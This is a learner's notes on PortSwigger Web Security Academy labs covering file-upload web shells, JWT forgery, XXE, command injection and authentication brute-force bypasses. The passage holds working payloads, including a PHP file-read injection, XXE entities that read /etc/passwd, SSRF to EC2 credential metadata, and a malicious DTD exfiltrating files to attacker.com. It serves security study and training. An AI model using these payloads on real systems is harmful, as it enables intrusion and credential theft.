            - lab link and the solution ( detailed solution here)
                
                [https://portswigger.net/web-security/file-upload/lab-file-upload-web-shell-upload-via-path-traversal](https://portswigger.net/web-security/file-upload/lab-file-upload-web-shell-upload-via-path-traversal)
                
            - if u upload a php file, and u access it, u ll see the code, it doesn’t get executed
                
                ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20163.png)
                
            - like mentioned in the lab description, we have to look for a directory traversal to to execute it
            - i have seen that before in CTFs where there is an `include()` for example that will execute the php code
            - but, the scenario is kinda different, there is no code execution in the folder where u upload to, so we’ll try to upload to the parent folder and see if we can have code execution
            - theory part (IMPORTANT)
                
                Some servers may serve the contents of the uploaded file as plain text.
                
                This kind of configuration often differs between directories. A directory to which user-supplied files are uploaded will likely have much stricter controls than other locations on the filesystem that are assumed to be out of reach for end users. If you can find a way to upload a script to a different directory that's not supposed to contain user-supplied files, the server may execute your script after all.
                
                TIP :  Web servers often use the `filename`field in `multipart/form-data` requests to determine the name and location where the file should be saved.
                
                Read **Preventing file execution in user-accessible directories from :** 
                
                [File uploads | Web Security Academy](https://portswigger.net/web-security/file-upload)
                
            - when i upload with a filename of a `../w4.php` i get the same response “The file avatars/w4.php has been uploaded.” which suggests that the server is stripping the directory traversal sequence `../` from the file name.
            - Next, we try URL encoding the forward slash (`/`) character, resulting in
                
                ```
                filename="..%2fexploit.php"
                ```
                
                ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20164.png)
                
            - we get a difference response this time “The file avatars/../w4.php has been uploaded.”
            - this indicates that the file name is being URL decoded by the server.
            - go back and copy image link to find carlos’s secret
                
                ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20165.png)
                
                - or access it without a `../` :
                
                [https://0a4d00ed04c1bcb9c02b22dc00d300e4.web-security-academy.net/files/w4.php](https://0a4d00ed04c1bcb9c02b22dc00d300e4.web-security-academy.net/files/w4.php)
                
                ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20166.png)
                
            - the file was uploaded to a higher directory in the filesystem hierarchy (`/files`), and then executed by the server.
    - Web shell upload via extension blacklist bypass
        - lab link  full detailed solution
            
            [https://portswigger.net/web-security/file-upload/lab-file-upload-web-shell-upload-via-extension-blacklist-bypass](https://portswigger.net/web-security/file-upload/lab-file-upload-web-shell-upload-via-extension-blacklist-bypass)
            
        - theory part
            
            Many servers also allow developers to create special configuration files within individual directories in order to override or add to one or more of the global settings. Apache servers, for example, will load a directory-specific configuration from a file called `.htaccess`if one is present (portswigger url below also gives a IIS example).
            
            read Insufficient blacklisting of dangerous file types in the url **below** 
            
            [https://portswigger.net/web-security/file-upload](https://portswigger.net/web-security/file-upload)
            
        - the `.php` extension is blacklisted
        - i tried renaming to `.php5` , the file got uploaded but not executed (app does not execute php in that directory)
        - we will enable php by uploading a  `.htaccess`  which will map the arbitrary extension (`.yo`) to the executable MIME type `application/x-httpd-php`.
            - As the server uses the `mod_php`module, it knows how to handle this already.
            - `mod_php` means **PHP, as an Apache module**.
                
                ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20167.png)
                
            - Otherwise, we would have needed to add this line (i guess) :
            
            ```html
            LoadModule php_module /usr/lib/apache2/modules/libphp.so
            ```
            
        - the content of the file  `.htaccess` that we uploaded is
            
            ```html
            AddType application/x-httpd-php .yo
            ```
            
            - Change the value of the `filename` parameter to `.htaccess`.
            - Change the value of the `Content-Type` header to `text/plain`.
            
            ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20168.png)
            
        - Next, we rename our webshell file to `webshell.yo` and change the Content-Type to `application/x-httpd-php`
            
            (since we mapped that to the  `.yo` extension in the `.htaccess` file we uploaded)
            
            ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20169.png)
            
        - Thanks to our malicious `.htaccess`file, the `.yo` file was executed as if it were a `.php`file.
        - copy uploaded image url and get flag
            
            ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20170.png)
            
        
    - Web shell upload via obfuscated file extension
        - lab link
            
            [https://portswigger.net/web-security/file-upload/lab-file-upload-web-shell-upload-via-obfuscated-file-extension](https://portswigger.net/web-security/file-upload/lab-file-upload-web-shell-upload-via-obfuscated-file-extension)
            
        - Basically, certain file extensions are blacklisted, but this defense can be bypassed using a classic obfuscation technique.
        - this techniques are listed in the portswigger course
            
            check **Obfuscating file extensions** from the link below
            
             [https://portswigger.net/web-security/file-upload](https://portswigger.net/web-security/file-upload)
            
        - after trying these techniques, the null byte one works
            
            Add semicolons or URL-encoded null byte characters before the file  extension.
            
             If validation is written in a high-level language like PHP or Java, but the server processes the file using lower-level functions in C/C++, for example, this can cause discrepancies in what is treated as the end of the filename: `exploit.asp;.jpg`or `exploit.asp%00.jpg`
            
        - the filename used to bypass the blacklist is `exploit.php%00.jpg`
            
            ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20171.png)
            
        - we access `exploit.php` to solve the lab ( null byte and the rest is ignored by the server  )
            
            ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20172.png)
            
        
    - Remote code execution via polyglot web shell upload
        - course/theory part
            
            ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20173.png)
            
            [https://portswigger.net/web-security/file-upload](https://portswigger.net/web-security/file-upload)
            
        - Detailed video solution
            
            [https://www.youtube.com/watch?v=uGk5_yDbSeQ](https://www.youtube.com/watch?v=uGk5_yDbSeQ)
            
        - in this case, the server tries to verify some properties of the image to check it’s nature (not only the MIME Type ) and it doesn’t care about the extension apparently
        - the solution of this lab is done by the tool ExifTool which can be installed in Linux with `apt install exiftool`
        - the tool will help us inject malicious code within the metadata of an image :
            
            ```html
            exiftool -Comment="<?php echo 'START ' . file_get_contents('/home/carlos/secret') . ' END'; ?>" midorya.jpg -o webshell.php
            ```
            
            - This adds your PHP payload to the image's `Comment` field, then saves the image with a `.php` extension.
        - if we inspect the generated file
            - we can see that we added the field called `Comment`
            
            ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20174.png)
            
        - file get uploaded and we can find the flag
            - as u can see, the use of `START` and `END` was useful
            
            ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20175.png)
            
        - a Polygot file means a file acting like two different file types at the same time (i guess).
        - to see the file in burp, we should add the images MIME type
            
            ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20176.png)
            
            ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20177.png)
            
        - how i understood it is since the server executes PHP and we’re able to inject php code between `<?php` and `?>,` it gets executed (it’s probably not important that our injection was done in metadata as long as it’s inside the image)
        - if server was allowing GIFs and server checks magic bytes, already got the solution in my notes of adding magic bytes
        
- JWT
    - JWT authentication bypass via unverified signature
        - lab
            
            [https://portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-unverified-signature](https://portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-unverified-signature)
            
        - portswigger suggests solving these labs using [JWT Editor extension](https://portswigger.net/bappstore/26aaa5ded2f74beea19e2ed8345a93dd) that u can find in BApp Store
        - Since the server doesn't verify the signature of the JWT, we’ll be using the none algorithm attack
            - steps
                1. send request to repeater 
                2. access JSON Web Token tab 
                3. change the username in the payload section
                4. Attack (button) 
                5. “none” signing algorithm (button)
                6. copy the new JWT and use it
            - before
                
                ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20178.png)
                
            - after
                
                ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20179.png)
                
        - using the new JWT, we access `/my-account`
        - if you didn’t notice “Admin panel” in the http response then  it’s not the admin user
        - in this case, i had to redo the none attack with the name “administrator” instead of “admin’
        - Now, that i can see “Admin panel” in the response, using burp or gui, access that endpoint and delete Carlos to solve the lab
            
            ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20180.png)
            
            ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20181.png)
            
            ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20182.png)
            
            follow redirection : 
            
            [https://www.notion.so](https://www.notion.so)
            
    - JWT authentication bypass via flawed signature verification
        - in the lab description, they say that the server is insecurely configured to accept unsigned JWTs.
        - so i simply repeated the same process i did in the previous lab to delete carlos (no idea what’s the point of this lab)
    - JWT authentication bypass via weak signing key
        - According to lab description, signing key can be easily brute-forced using the wordlist inside
            
            [https://raw.githubusercontent.com/wallarm/jwt-secrets/master/jwt.secrets.list](https://raw.githubusercontent.com/wallarm/jwt-secrets/master/jwt.secrets.list)
            
            [https://github.com/wallarm/jwt-secrets](https://github.com/wallarm/jwt-secrets)
            
        - i cracked JWT using the previous wordlist and the tool jwtcrack
            
            ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20183.png)
            
            [https://github.com/Sjord/jwtcrack](https://github.com/Sjord/jwtcrack)
            
        - u can also crack the jwt with hashcat
            
            ```html
            hashcat -a 0 -m 16500 <YOUR-JWT> /path/to/jwt.secrets.list
            ```
            
            ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20184.png)
            
            ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20185.png)
            
        - i resigned the token using [jwt.io](http://jwt.io)
            
            ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20186.png)
            
        - using the new token, we solve the lab
        - u can also sign the token with the burp extension (check video inside)
            - steps
                - New symetric key
                - Generate
                - replace value of the “k” key with the base64 encoded secret key
                - presse OK
                - u can go to tab “JSON Web Token”, modify JWT payload and sign (choose the new key we added which uses HS256 )
            
            ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20187.png)
            
            [JWT Lab03](https://www.youtube.com/watch?time_continue=340&v=Wu6UR-Myiy0&feature=emb_logo)
            
    - Injecting self-signed JWTs via the jwk parameter
        - theory
            
            check the part below
            
            Injecting self-signed JWTs via the jwk parameter
            
            [https://portswigger.net/web-security/jwt](https://portswigger.net/web-security/jwt)
            
        - steps (from portswigger)
            1. With the extension loaded, in Burp's main tab bar, go to the **JWT Editor Keys** tab.
            2. [Generate a new RSA key.](https://portswigger.net/web-security/jwt/working-with-jwts-in-burp-suite#adding-new-signing-keys) (i did it with JWK key format)
            3. Send a request containing a JWT to Burp Repeater.
            4. In the message editor, switch to the extension-generated **JSON Web Token** tab and [modify](https://portswigger.net/web-security/jwt/working-with-jwts-in-burp-suite#editing-the-contents-of-jwts) the token's payload however you like.
            5. Click **Attack**, then select **Embedded JWK**. When prompted, select your newly generated RSA key.
            6. Send the request to test how the server responds.
        - so basically the extension automates the attack for you
    - JWT authentication bypass via jku header injection
        - theory part and
            
            check part below
            
            `Injecting self-signed JWTs via the jku parameter`
            
            [https://portswigger.net/web-security/jwt](https://portswigger.net/web-security/jwt)
            
        - full detailled solution in the lab
            
            [https://portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-jku-header-injection](https://portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-jku-header-injection)
            
        - steps i followed to solve the lab
            - in “JWT Editor Keys” > generate RSA > copy public key as JWK
            - go to exploit server > paste the public key in it but update it to the following format
                
                ```html
                {
                    "keys": [
                        {
                    "kty": "RSA",
                    "e": "AQAB",
                    "kid": "d85e9145-992b-4ca0-bc96-258aedb6548a",
                    "n": "p4al97oTbdI-TIJG8pOtbulHCl30b7mbintcwnfstBwAoF5GmZvzz1vD3zD4Vmvbvjs-gPhJv8tdLPYSotMULuN9AfnoK-KK38vqUMXCdQ-xHTFVeTYsafbOMUcgK1vuVIkdJMfd-58m6cRw6o7GCqBcvxcyqS0gcQeBmzY69dIvgOkqbV9r-l64qxpf__uoS3qsO4gFqvrCjSrCDrLq9V1Q9bSqzzyvcveZBqL2-pePzIL5eIV_uvH5DxKwR8fab9RQofRWQlcvYrWy7izaihhk3RUwJb4cp7n_98d-be--cJgyRcMDqqehqlM9AVeOn-EV9TyE46OJ24J78pBiAQ"
                        }
                    ]
                }
                ```
                
            - copy the kid from exploit server (  the `kid` in your JSON and the JWT header part must be the the same !! )
            - update the payload by changing **`sub`** to administrator and update the header part `kid` and add a `jku` of the exploit server
                
                ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20188.png)
                
            - then sign using the RSA Key, and that’s pretty much it
    - Injecting self-signed JWTs via the kid parameter
        - theory
            
            check `Injecting self-signed JWTs via the kid parameter`
            
            in [https://portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-kid-header-path-traversal](https://portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-kid-header-path-traversal)
            
        - lab link for detailled solution
            
            [https://portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-kid-header-path-traversal](https://portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-kid-header-path-traversal)
            
        - basically, we’re supposing that the `kid`  parameter is used to retrieve filename in a linux server
        - so we’re going to give it the value of `../../../../dev/null` since that file is always empty
        - this is equivalent to using the base64 encoded null byte `AA==` as a key
            
            ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20189.png)
            
        - steps
            - after modifying payload, modify header to look like this
                
                ```
                {
                "kid": "../../../../../../dev/null",
                "alg": "HS256"
                }
                ```
                
            - in “JWT Editor Keys”, create a new  symmetric key and update `k` with  `AA==` and `kid` with `../../../../dev/null`
                - Click **New Symmetric Key**.
                - In the dialog, click **Generate** to generate a new key in JWK format. Note that you don't need to select a key size as this will automatically be updated later.
                - Replace the generated value for the `k` property with a Base64-encoded null byte (`AA==`).
                
                ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20190.png)
                
            - sign using this symmetric key to get admin access
                
                ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20191.png)
                
    - JWT authentication bypass via algorithm confusion
        - course and challenge links
            
            [https://portswigger.net/web-security/jwt/algorithm-confusion](https://portswigger.net/web-security/jwt/algorithm-confusion) 
            
            [https://portswigger.net/web-security/jwt/algorithm-confusion/lab-jwt-authentication-bypass-via-algorithm-confusion](https://portswigger.net/web-security/jwt/algorithm-confusion/lab-jwt-authentication-bypass-via-algorithm-confusion)
            
        - basically you find public key somehow and u use it to as an asymetric key
        - we find the public key
            
            ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20192.png)
            
        - my steps in screenshots
            - click ok after pasting
                
                ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20193.png)
                
            - encrypt generated pem with base64
                
                ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20194.png)
                
            - new symetric key, gernerate random value, use generated base64 from decoder as a value for “k”
                
                ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20195.png)
                
            - change alg and sub, then sign with “don’t modify headers”
                
                ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20196.png)
                
            - and that’s pretty much it, u can delete carlos with that token
                
                ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20197.png)
                
        - check lab solution for detailled steps to reproduce the attack
- XXE
    - pwnfunction & john hammond video
        
        [](https://www.youtube.com/watch?v=gjm6VHZa_8s)
        
    - Exploiting XXE using external entities to retrieve files
        - since they said in the lab description that the *‘Check stock’ feature that parses XML input and returns any unexpected values in the response.”*
        - we simply add an external entity to our xml to get the content of `/etc/passwd`
            
            ```xml
            <?xml version="1.0" encoding="UTF-8"?>
            <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
            <stockCheck><productId>
            &xxe;
            </productId><storeId>1</storeId></stockCheck>
            ```
            
        - this solves the lab
            
            ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20198.png)
            
    - Exploiting XXE to perform SSRF attacks
        - the goal is to retrieve the server's IAM secret access key from the EC2 metadata endpoint.
        - video solution
            
            [How to turn an XXE into an SSRF exploit!](https://youtu.be/DDxEuGcMcSE)
            
        - to perform an XXE attack we can simply add the line inside and reference `&xxe;`
            
            ```xml
            <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://internal.vulnerable-website.com/"> ]>
            ```
            
        - if we google that, we ll find that to get the instance metadata from within a running instance, we should check instance inside
            - u can try this url in your browser, this should endpoint should be requested from the instance to give you that specific instance metadata
            
            ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20199.png)
            
        - or u can rely on server showing you the next directory ( check video solution or portswigger solution)
            
            ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20200.png)
            
        - u keep using the next directory, till u get the metadata
            
            ```xml
            <?xml version="1.0" encoding="UTF-8"?>
            <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin"> ]>
            <stockCheck><productId>&xxe;</productId><storeId>1</storeId></stockCheck>
            ```
            
            ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20201.png)
            
        - pay attention to typos in your DTD, or copy paste something an xml that must work like `/etc/passwd` (from previous lab)
    - Blind XXE with out-of-band interaction
        - You can detect the [blind XXE](https://portswigger.net/web-security/xxe/blind) vulnerability by triggering out-of-band interactions with an external domain.
        - goal is to use an external entity to make the XML parser issue a DNS lookup and HTTP request to Burp Collaborator.
        - basically, we should make a simple request to burp collabarotor and detect it
        - we can simply solve the lab using the xml inside
            
            ```xml
            <?xml version="1.0" encoding="UTF-8"?>
            <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "https://vihdivrhajb25rbolipg358hq8wzkp8e.oastify.com"> ]>
            <stockCheck><productId>&xxe;</productId><storeId>1</storeId></stockCheck>
            ```
            
            ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20202.png)
            
            ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20203.png)
            
    - Blind XXE with out-of-band interaction via XML parameter entities
        - theory ( important )
            
            check Detecting blind XXE using out-of-band ([OAST](https://portswigger.net/burp/application-security-testing/oast)) techniques
            
            [https://portswigger.net/web-security/xxe/blind](https://portswigger.net/web-security/xxe/blind)
            
        - the goal is to do a simple blind XXE and call a collaborator server but without using an entity in the xml code (including parameter entity cuz it’s an entity)
        - so we can use a parameter entity which gets declared inside the DTD (and not inside the code)
            
            ```xml
            <?xml version="1.0" encoding="UTF-8"?>
            <!DOCTYPE doc [ <!ENTITY % xxe SYSTEM "http://727cufapre59wu4wx25j47cxkoqfe92y.oastify.com"> %xxe; ]>
            <stockCheck>
            <productId>1</productId>
            <storeId>1</storeId>
            </stockCheck>
            ```
            
            - This XXE payload declares an XML parameter entity called `xxe` and then uses the entity within the DTD. This will cause a DNS lookup and HTTP request to the attacker's domain, verifying that the attack was successful
            
            ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20204.png)
            
            ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20205.png)
            
    - Exploiting blind XXE to exfiltrate data out-of-band
        - code from pwnfunction video - didn’t work here
            - main.xml
                
                ```xml
                <?xml version="1.0" encoding="UTF-8"?>
                <!DOCTYPE data system "http://attacker.com/malicious.dtd" >
                <data>&send</data>
                ```
                
            - malicious.dtd
                
                ```xml
                <!ENTITY % file SYSTEM "file:///etc/passwd">
                <!ENTITY % wrapper "<!ENTITY send SYSTEM 'http://attacker.com/?x=%file;'>">
                %wrapper;
                ```
                
                `%wrapper` is equivalent to the last line of the following screenshot : 
                
                ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20206.png)
                
        - must see - theory part
            
            [https://portswigger.net/web-security/xxe/blind](https://portswigger.net/web-security/xxe/blind)
            
            ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20207.png)
            
        - solution code
            - main xml
                - make sure there is a line break between DTD and rest of xml
                
                ```xml
                <!DOCTYPE doc [<!ENTITY % xxe SYSTEM "http://attacker.com/malicious.dtd"> %xxe;]>
                ```
                
                ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20208.png)
                
            - malicious.dtd
                - how i understood it is that when u call a parameter entity %x the parser looks for the value of x and assign it to the variable x
                
                ```xml
                <!ENTITY % file SYSTEM "file:///etc/hostname">
                <!ENTITY % wrapper "<!ENTITY &#x25; send SYSTEM 'http://8fod7gnq4fia9vhxa3ikh8pyxp3grdf2.oastify.com/?x=%file;'>">
                %wrapper;
                %send;
                ```
                
                ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20209.png)
                
    - Exploiting blind XXE to retrieve data via error messages
        - theory part
            
            Exploiting blind XXE to retrieve data via error messages
            
            [https://portswigger.net/web-security/xxe/blind](https://portswigger.net/web-security/xxe/blind)
            
            An alternative approach to exploiting blind XXE is to trigger an XML parsing error where the error message contains the sensitive data that you wish to retrieve. This will be effective if the application returns the resulting error message within its response.
            
        - solution code
            - main xml
                
                ```xml
                <?xml version="1.0" encoding="UTF-8"?>
                <!DOCTYPE doc [<!ENTITY % xxe SYSTEM "https://exploit-0a3e00fc03bf5dc5c0c87e87015400fd.exploit-server.net/malicious.dtd"> %xxe;]>
                <stockCheck><productId>1</productId><storeId>1</storeId></stockCheck>
                ```
                
            - malicious.dtd
                
                ```xml
                <!ENTITY % file SYSTEM "file:///etc/passwd">
                <!ENTITY % wrapper "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
                %wrapper;
                %error;
                ```
                
    - Exploiting XInclude to retrieve files
        - theory part
            
            [https://portswigger.net/web-security/xxe](https://portswigger.net/web-security/xxe)
            
            ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20210.png)
            
        - solution
            
            we take the payload from the course, url encode it, and inject it in the vulnerable field
            
            ```xml
            <foo xmlns:xi="http://www.w3.org/2001/XInclude">
            <xi:include parse="text" href="file:///etc/passwd"/></foo>
            
            ```
            
            ```xml
            %3c%66%6f%6f%20%78%6d%6c%6e%73%3a%78%69%3d%22%68%74%74%70%3a%2f%2f%77%77%77%2e%77%33%2e%6f%72%67%2f%32%30%30%31%2f%58%49%6e%63%6c%75%64%65%22%3e%0a%3c%78%69%3a%69%6e%63%6c%75%64%65%20%70%61%72%73%65%3d%22%74%65%78%74%22%20%68%72%65%66%3d%22%66%69%6c%65%3a%2f%2f%2f%65%74%63%2f%70%61%73%73%77%64%22%2f%3e%3c%2f%66%6f%6f%3e
            ```
            
            ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20211.png)
            
    - Exploiting XXE via image file upload
        - theory
            
            [https://portswigger.net/web-security/xxe](https://portswigger.net/web-security/xxe)
            
            ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20212.png)
            
            - Some applications allow users to upload files which are then processed server-side.
            - Since the SVG format uses XML, an attacker can submit a malicious SVG image and so reach hidden attack surface for XXE vulnerabilities.
        - solution
            - The SVG image format uses XML.
            - from what i understood, there is a predefined `text` element in the structure of an svg, it’s content is displayed inside the image
                
                for example here i put a hello inside the text element, and it appeared inside of the result svg picture
                
                if you don’t have a mac, u can use an online viewer
                
                ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20213.png)
                
            - solution code :
            
            ```xml
            <?xml version="1.0" standalone="yes"?>
            <!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]>
            <svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1">
            <text font-size="16" x="0" y="16">&xxe;</text>
            </svg>
            ```
            
            - result
                
                ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20214.png)
                
                ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20215.png)
                
- OS command injection
    - Blind OS command injection with time delays
        - to solve the lab, used `x ; sleep 10 #` url encoded
        - `#` is what we use to comment in bash
- Authentification
    - Username enumeration via different responses
        - using `Intruder ⇒ Cluster bomb` we solve the lab
    - 2FA simple bypass
        - theory
            - If the user is first prompted to enter a password, and then prompted to enter a verification code on a separate page, the user is effectively in a "logged in" state before they have entered the verification code. In this case, it is worth
            
            ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20216.png)
            
        - So basically, the idea is that when u log in with creds, u get a token which is a valid ( even if validating MFA will give you another valid token)
        - so i just did logged in with victim user → Back to lab home → My account → challenge solved
            
            ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20217.png)
            
            ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20218.png)
            
        - u can also log in with first user, and get the endpoint of My account and use it with victim token
    - Password reset broken logic
        - i intercepted the reset password request, found that it contains the username and changed it
            
            ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20219.png)
            
    - Username enumeration via subtly different responses
        - a simple bruteforce where the right creds have a different status code and a different response length
            
            ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20220.png)
            
    - Username enumeration via response timing
        - if you make 3 failed attempts times u’ll get blocked
            
            ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20221.png)
            
        - Challenge hint and link to full detailed solution (important)
            - To add to the challenge, the lab also implements a form of IP-based brute-force protection.
            - However, this can be easily bypassed by manipulating HTTP request headers.
            
            [https://portswigger.net/web-security/authentication/password-based/lab-username-enumeration-via-response-timing](https://portswigger.net/web-security/authentication/password-based/lab-username-enumeration-via-response-timing)
            
        - the IP-based brute-force protection can be bypassed by adding the following http header
            - but for each value of this header, u can again only do 3 failed attempts
            - u can put any value in this header (not a special character) a letter, a number
            
            ```xml
            X-Forwarded-For: some_value
            ```
            
        - After experimenting with usernames and passwords, u should notice that when the username is invalid, the response time is roughly the same.
        - However, when you enter a valid username (your own), the response time is increased depending on the length of the password you entered.
        - In other words, if you enter a valid username and a wrong long password, it takes more time to see the response
        - Thereby, we have a way to tell if a username is valid or not (combining the username with a long password and looking for a long response time).
        - Using Intruder’s Pitchfork, we iterate over both the X-Forwarded-For and  the username at the same time
            - used the same word list of usernames for both payloads (u can also use incremental numbers in the header value)
            - in order to know how much time it took to get the response, we should check “Response received” and “Response completed” in Columns
                
                ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20222.png)
                
            - Then, we easily find the right username
                
                ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20223.png)
                
        - After finding the username, we make another brute force where we iterate over the header and the password looking for a 302 status code
            
            ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20224.png)
            
        - we login with the found creds to solve the lab
        - they say in the lab solution that u can also use a cluster bomb, however i don’t see that as practical (why inside)
            - because you ll find that the a value x for the X-Forwarded-For header will be combined with a lot of combination creds, which are more than 3, which means that it will get blocked
            
        - A tip for using cluster bomb mode
            
             - the order of payloads set 1,2,3 corresponds to the order of their position in the request, check example below :
            
            ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20225.png)
            
            - payload set 1 are  header payloads
            - payload set 2 ifor the username
            - payload set 3 for the password
    - Broken brute-force protection, IP block
        - theory
            
            IP is blocked if you fail to log in too many times. 
            
            the counter for the number of failed attempts resets if the IP owner logs in successfully. 
            
            This means an attacker would simply have to log in to their own account every few attempts to prevent this limit from ever being reached.
            
            ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20226.png)
            
        - basically, doing a succesful authentication resets blacklist counter
        - so we can do 2 failed attempts and a successfull one with the credentials that they gave us (wiener:peter)
        - solution i made for this lab
            
